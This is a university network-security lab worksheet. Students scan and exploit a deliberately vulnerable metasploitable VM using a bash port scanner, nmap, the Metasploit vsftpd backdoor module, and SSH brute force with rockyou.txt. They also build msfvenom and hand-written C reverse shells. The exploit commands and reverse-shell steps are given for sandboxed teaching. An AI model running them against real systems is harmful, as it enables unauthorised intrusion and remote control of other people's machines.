# Lab 1: Network Security

{% hint style="danger" %}
READ: Any knowledge and techniques presented here are for your learning purposes only. It is **ABSOLUTELY ILLEGAL** to apply the learned knowledge to others without proper consent/permission, and even then, you must check and comply with any regulatory restrictions and laws.
{% endhint %}

The aim of this lab is to introduce you to some useful network exploit concepts and tools commonly used to get familiar with attack styles, as well as practice Linux commands from Lab 0 in the context. In addition, to have a better understanding about the underlying mechanisms of tools, unlike in CITS1003 where we just used tools to observe outcomes.

{% hint style="info" %}
This means it is essential to have a deeper understanding of tools and how they operate rather than only learning what tools and scripts to use in given scenarios. This applies to all the labs we will do in this unit, so please remember!
{% endhint %}

The tools we will cover are: `nmap` and `metasploit`, the tools that are often used to gather information and gain the first step into the target host(s). Those tools are already installed on your Kali Linux. Of course, we will cover more useful and interesting tools later on as well.

{% hint style="info" %}
In this lab, we will be running at least two VMs: Kali and metasploitable.
{% endhint %}

## 1.0. vulnerable VM: metasploitable

First, we will set up a vulnerable VM named [_metasploitable_](https://docs.rapid7.com/metasploit/metasploitable-2) (click the link and download the VM).

If your machine uses an Intel chip AMD64, you can move on to the next tasks.

If your machine uses an Apple Silicon ARM64, you must do the following tasks to run metasploitable on UTM:

1. Install [brew](https://brew.sh/) if not done already
2. Install qemu if not done already: `brew install qemu`
3. Navigate to the directory containing the metasploitable image file you downloaded
4. Convert image:\
   `qemu-img convert -p -O qcow2 Metasploitable.vmdk Metasploitable.qcow2`
5. Open UTM: add new -> Emulate -> Other -> skip ISO
6. Settings -> remove drive
7. Settings -> QEMU -> untick "UEFI boot"
8. Settings -> add drive -> select the created image (`.qcow2` file) from step 4
9. Start the VM

Please note, that the VMs used in the lab should be able to reach each other (test using `ping`).

## 1.1. Port Scan using Bash

First, let's create our own port scanner using a bash script to understand how a script may be created and be used.

This only works on new versions of Bash (which is the case with Kali). If you are not using Kali, you can test by following the steps below:

1. start a netcat listener on terminal 1: `nc -vnlp 4444`
2. On a different terminal (terminal 2), start a bash session: `bash`
3. Still on terminal 2, send a message using the cat command:\
   `cat >/dev/tcp/localhost/4444`
4. From terminal 1, you should see a connection message
5. You can press `ctrl + C` to end

If you do not see the connection message at step 4, then you need to upgrade your Bash version (or use Kali for simplicity). If you attempt to connect to a closed port, you will simply receive a "Connection refused" message.

So we have a basic understanding of using Bash and open ports from the above example, so now we can create our own port scanner Bash script!

Download the portscan.sh script:

```
wget https://raw.githubusercontent.com/uwacyber/cits3006/2022s2/cits3006-labs/files/portscan.sh
```

The code is also shown below, which you should read through and try to understand what it is trying to do.

```bash
#!/bin/bash
if [ $# -ne 1 ]
then
    echo "Usage: `basename $0` {IP address or hostname}"
    exit 1
fi

# define a variable and set it to the value passed as the first argument ($1)
ip_address=$1
# write the current date to the output file
echo `date` >> $ip_address.open_ports

# for loop, where “i” starts at 1 and each time increments up to 65535
for port in {1..65535}
do
    # use a short timeout, and write to the port on the IP address
    timeout 1 echo >/dev/tcp/$ip_address/$port
    # if that succeeded (checks the return value stored in $?)
    if [ $? -eq 0 ]
    then
        # append results to a file named after the date and host
        echo "port $port is open" >> "$ip_address.open_ports"
    fi
done
```

{% hint style="info" %}
If the above code is hard to follow, please revise the scripting (e.g., CITS2003).
{% endhint %}

Remember to add executable permission:

```
chmod +x portscan.sh
```

Now we can run it, let's run it against the metasploitable VM (check its IP address by running `ifconfig`):

```
./portscan.sh [target IP]
```

Note that this is quite slow (give it a few mins), but once done, it will create a result file `[target IP].open_ports`. You can run the script against other VMs if you have, or locally by inputting `localhost`.

![](<../.gitbook/assets/image (6) (1) (1).png>)

We just created our own port scanner using Bash!

The underlying principle is the same, the tools we will cover next will have some scripts that carry out the specified tasks like above, which are just automatically ran through the tool commands.

## 1.2. Nmap

Since writing scripts ourselves is inefficient, we now will have a look at a tool named _Nmap_.

Nmap is an open-source tool for network exploration and security auditing. It inspects raw IP packets to find various information about the network and systems, including services (name and version), OS and versions, firewalls, and more. Nmap is useful for system administration (e.g., network inventory, service upgrades, monitoring, etc.), but of course, it is also useful for malicious purposes.

The first intuitive use of Nmap is to scan the network to find (a potentially vulnerable) host(s). This can be done by scanning the IP range.

`$ nmap -sn [target IP range]`

e.g.,

```
nmap -sn 192.168.64.0/24
```

![](<../.gitbook/assets/image (3) (1) (1) (1) (1).png>)

Here, the flag `-sn` indicates that it uses ping to check whether the host exists or not. So this is basically a script that runs a ping command to the given network address(es)! There are other flags that could be used, which you can find more from [>>here<<](https://nmap.org/book/man-briefoptions.html).

One of the listed addresses should be your victim machine (metasploitable VM).

{% hint style="warning" %}
If you don't see your metasploitable VM in the list, please check your network settings.
{% endhint %}

Now we have discovered our target machine, we can scan to see which ports are open (i.e., what services are running).

```
nmap -sV -O -T4 192.168.64.5
```

{% hint style="warning" %}
Find out what those flags mean.
{% endhint %}

Then we should be able to see something like:

![](<../.gitbook/assets/image (6) (1) (1) (1) (1).png>)

So we have used Nmap to discover hosts in the network, and also scan them to find services and OS details. Just remember, Nmap is just executing a bunch of scripts like we wrote in the previous section, just automated. So you can always dig through its exploit database and have a look at the details of those attacks (because it is open-source, it is possible).

Now we will move on to gaining access by exploiting some of the vulnerabilities associated with the services we found.

## 1.3. Metasploit

For this part of the lab, we will carry out a few exploits using the Metasploit framework. The Metasploit framework is essentially (and also) a collection of scripts that performs the described exploit, and most scripts are targeting vulnerabilities on networks and servers. The Metasploit framework is open-source, so it can also be customised to various needs. So let's have a look at a few exploit examples in this lab.

First, you may need to update it to the latest version.

```
sudo apt update -y; sudo apt install Metasploit-framework -y
```

From the nmap scan above, we have discovered the IP address of our target (metasploitable VM) machine and the services running. The first one we will exploit is the one at the top at port 21 - the FTP service.

### 1.3.1. Exploit FTP

The Nmap scan revealed the version of the FTP on the target machine. If you search for vulnerabilities associated with the given version `vsftpd 2.3.4`, you will quickly discover that there is a backdoor vulnerability (more precisely, [`CVE-2011-2523`](https://www.cvedetails.com/cve/CVE-2011-2523/)). The CVSS Score is 10, indicating that the impact of this vulnerability is severe.

Since it's there, we'll exploit it. Launch the Metasploit from the terminal:

```vim
msfconsole
```

![](<../.gitbook/assets/image (5) (1) (1) (1) (1).png>)

From the msfconsole, we can search for the identified service-related exploits

```
use vsftpd
```

![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png>)

In fact, there is only one exploit (the backdoor one) available, so it will be automatically be selected. If it is not automatically selected, just type: `use 0` (i.e., the number 0th exploit) to select it.

{% hint style="info" %}
If you already know the exploit to use and its path, you can type in:

`use [path to the exploit]`
{% endhint %}

Next, we need to check options to see what inputs the exploit requires.

```
show options
```

![](<../.gitbook/assets/image (2) (1) (1) (1) (1).png>)

The exploit is actually simple, and only requires the target host's IP address. So set the RHOST with the target IP address found using Nmap (the RPORT is already set, but if the FTP service runs on a different port or if the RPORT is not set, you can update/set it).

```
set RHOST 192.168.64.5
```

![](<../.gitbook/assets/image (1) (1) (1).png>)

All options are set, so now we can run the exploit by simply typing `run`.

![](<../.gitbook/assets/image (2) (1) (1) (1).png>)

{% hint style="info" %}
The exploit may fail (as shown above), but you can simply run it again.
{% endhint %}

Now you have a remote shell on your target host! Try navigating, creating files, deleting files etc., and observe from your metasploitable VM to see those changes.

#### How does this exploit work?

This vulnerability came about when someone had uploaded a modified version of `vsftpd` to the master site and some users downloaded this version for their systems (i.e., it came with the backdoor). The backdoor opened port 6200 to give the attacker a command shell.

This showed the importance of authentication and authorisation (don't let anyone upload/update important data) and also the ability to check and approve changes.

#### Finishing

Finally, you can press `ctrl + C` to end the session. If you are finished with the exploit, you can type `back` to go back to the main `msfconsole` menu.

### 1.3.2. Exploit SSH

Okay, so the previous one is highly unlikely given the vulnerable service is more than a decade old and people have moved on. So let's try some other exploits against a more common service - SSH!

We assume we don’t know the credentials to log in to the metasploitable VM, so we must figure out both the username and password to gain access.

From Nmap scans, we know that the SSH service is running on port 22. However, its version is `OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)`. The protocol 1.0 had lots of bugs that could have been exploited easily, but 2.0 is much more secure. So instead, we will attempt a bruteforce attack.

Like before, we begin by searching for `ssh` related exploits in the Metasploit console:

```
search ssh
```

![](<../.gitbook/assets/image (4) (1) (1) (1) (1).png>)

... But there are too many! So let's reduce the selection to `ssh_login`:

```docker
search ssh_login
```

![](<../.gitbook/assets/image (6) (1) (1) (1).png>)

Two shows up, and we will use the first one and check the options:

```
use 0
show options
```

![](<../.gitbook/assets/image (3) (1) (1) (1).png>)

Like before, set the `RHOST` to be the target IP address. In addition, we must also provide the wordlist for username and password (you can either provide a single file that contains the pairs in `USERPASS_FILE`, or separately to try all pairs from the two files for `USER_FILE` and `PASS_FILE`). You can also read other option descriptions to change as necessary. For our bruteforce attack, we will use a `USERPASS_FILE` that comes with Metasploit.

```
set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt
```

![](<../.gitbook/assets/image (9).png>)

At this point, we can run the exploit (you can try, but it will take a while because its bruteforce, took me about 15 mins to finish). Since we know the credentials (msfadmin/msfadmin), we can shorten the waiting time by creating a shortened userpass file from the original file above (i.e., delete bunch of lines but keep the actual credential). Once run, you should eventually get to this:

![](<../.gitbook/assets/image (1) (1).png>)

{% hint style="info" %}
You would notice that this is SSH session 3, meaning I did find two other credentials that could be used to SSH to the metasploitable VM. Which ones do you think they are?
{% endhint %}

At this stage, you can use the credentials found to SSH into the victim machine. However, this bruteforce attack is quite inefficient because we have to guess both username and password. Imagine each credential login attempt takes 1 second, how long would it take to try 1 million credential pairs? To get a better picture, the widely used password wordlist `rockyou.txt` contains about 14 million passwords! So we must find a better way than trying to guess both username and password. This brings us to the next method.

We are going to revisit Nmap here, because one of the services running was `Samba smbd` (an innocent server daemon that provides filesharing and printing services), which can be exploited to reveal users! So run Nmap:

```
nmap -script smb-enum-users.nse -p 445 [target IP address]
```

{% hint style="info" %}
The script is basically enumerating through users' RIDs that uniquely identifies a user on a domain or system. The username is found because LSA function is exposed, which is used to convert RID to the username.
{% endhint %}

If you scroll down the list, you will find that the user “msfadmin” is the one that is not disabled! So we can use this information back in our `ssh_login` options!

We will also use the `rockyou.txt` password wordlist file that contains a lot of commonly used passwords. It comes with Kali at `/usr/share/wordlists`, you just have to extract it:

```
sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz
```

Once done, remove the USERPASS file and set USERNAME and PASS\_FILE.

```
unset USERPASS_FILE
set PASS_FILE /usr/share/wordlists/rockyou.txt
set USERNAME msfadmin
```

![](<../.gitbook/assets/image (5) (1) (1) (1).png>)

Now the bruteforce attack only has to guess the password!

{% hint style="info" %}
Although we have technically improved the attack speed, we are still (at the end of the day) bruteforcing – which is practically impossible nowadays. Such attacks can be mitigated easily by limiting the number of attempts within a given period of time, as well as enforcing multi-factor authentications.
{% endhint %}

### 1.3.3. Reverse Shell

The Metasploit also comes with tools to create vulnerable executable scripts/files using `msfvenom` module. For our instance, we will create a reverse shell using python code:

```
msfvenom -p python/shell_reverse_tcp LHOST=[attacker IP address] LPORT=[attacker listening port]
```

![](<../.gitbook/assets/image (3) (1) (1).png>)

The payload created is a python executable code, which you can execute from your victim host. You will also notice that `msfvenom` applied code obfuscation techniques so that you cannot directly read the payload to understand exactly what this code is doing.

{% hint style="info" %}
For this exercise, I just cloned my Kali VM and used it as the target. You can do similar, or run an existing VM and test also (should work on any OS).
{% endhint %}

But before you run the script (it will fail as you would have found out), you must first listen for activities from your attacker machine:

```
nc -lvnp 443
```

We set 443 to be the incoming port from the target host, so we listen on this port and wait until the target host executes the script. If this port isn't working for you, you can try a different port e.g., 4444. So now, let's execute the script from the target host:

```
python -c "[copy and paste payload here]"
```

![Left, you see the target host terminal. Right, you see the attacker terminal that got the reverse shell!](<../.gitbook/assets/image (4) (1) (1) (1).png>)

{% hint style="info" %}
Usually, the attacker will place the payload into an executable file (and likely autorun it). Such malicious payload can be created for various types of applications, not just Python (could be PHP, Java, .exe for Windows etc.). Also, there are many ways to hide such payload (masquerading, obfuscations etc.) – still a big issue today!
{% endhint %}

The above example would be considered _malware_. The `msfvenom` can be used to create various payloads to do malicious tasks so have a look at its library and explore (please do NOT use them other than on your own sandboxed/virtualised environments)!

### 1.3.4. Write our own Reverse Shell

So now we understand the tool can create reverse shell payloads for various applications, but how exactly does it work? Let's find out!

First, download the reverse shell files:

```
wget https://raw.githubusercontent.com/uwacyber/cits3006/2022s2/cits3006-labs/files/rshell.zip
```

![](<../.gitbook/assets/image (4) (1) (1).png>)

Unzip using the `unzip` command.

Let's test it first, we have to update the attacker's IP address in the `victim.c` (at line 27) code (you can update the port too if you want, but make sure to do it on both files).

Once done, we can now compile the c codes using the makefile provided (if you have binaries in the zip, delete them and recompile).

![](<../.gitbook/assets/image (1) (2).png>)

We can do this on a single machine, but you can also move the victim code to a different VM (remember to recompile if different architecture).

![For this example, I used two VMs - Kali (hacker) and Ubuntu (victim)](<../.gitbook/assets/image (8) (1) (1).png>)

So it works! Let's have a closer look at the code, starting with the `hacker.c` file.

There isn't much to this code really (i.e., typical socket handling in c), the most interesting part is from lines 83 to 105:

![](<../.gitbook/assets/image (5) (1) (1).png>)

This is where we prepare for command transmission (lines 93 - 96), and send the command (lines 99 - 103). Now let's have a look at the victim's code in `victim.c` file.

![](<../.gitbook/assets/image (7) (1) (1).png>)

Again, nothing much in the code other than typical socket coding for the client, BUT look at lines 61 - 63. This is where the reverse shell happens:

1. the [`dup2` function](https://man7.org/linux/man-pages/man2/dup.2.html) takes two arguments `oldfd` and `newfd`, where the two [file descriptors](https://en.wikipedia.org/wiki/File\_descriptor) (fd) are made equivalent (i.e., you can use either). For example, After `dup2(socket_id, 0)`, whatever file was opened on the descriptor `socket_id` is now also opened (with the same mode and position) on the descriptor `0`, i.e. on standard input.
2. This is applied to all other file descriptors 1 and 2 representing the standard output and the standard error, respectively.

This means all the `stdio` are redirected to the socket that is sent to the attacker (bad)!

{% hint style="info" %}
In normal server code, this is where the server would respond to the client with the response. But instead, since the victim's `stdio` are all redirected to the socket to the attacker, the attacker can now also _send_ commands back to the victim host (which is very bad!).
{% endhint %}

However, this code does not have any obfuscation, which means it is very easy to detect such code in use and be filtered/blocked. Hence, Metasploit tries to obfuscate the payload generated to hide such malicious code (but the detection mechanisms can also have their own techniques to look through obfuscations, albeit the performance varies).

## 1.4 Summary

In this lab, we covered two useful tools, Nmap and Metasploit. There were additional exercises to better understand how such tools work (port scanner and reverse shell) to provide a deeper understanding of different exploit techniques.

Next up, Malware.

{% hint style="info" %}
PREPARATION: the next lab uses a new VM - Windows 10. The ISO file is HUGE (\~6GB), so please download and set up the Windows 10 VM before going to the lab.
{% endhint %}
